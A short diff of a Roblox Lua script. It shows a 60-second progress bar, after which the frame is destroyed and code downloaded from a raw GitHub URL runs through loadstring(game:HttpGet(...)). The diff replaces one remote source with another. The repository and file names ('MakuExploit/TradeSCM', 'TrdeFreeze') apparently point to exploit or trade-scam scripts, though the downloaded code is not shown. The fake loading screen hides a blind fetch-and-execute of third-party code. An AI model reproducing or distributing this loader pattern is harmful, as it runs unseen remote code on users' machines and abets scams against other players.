@@ -135,5 +135,5 @@ TweenService:Create(ProgressBar, TweenInfo.new(60), {
 
 task.delay(60, function()
     Frame:Destroy()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/TradeSCM/refs/heads/main/Tradescm"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShilohScripts/EFTBlua/refs/heads/main/TrdeFreeze"))()
 end)
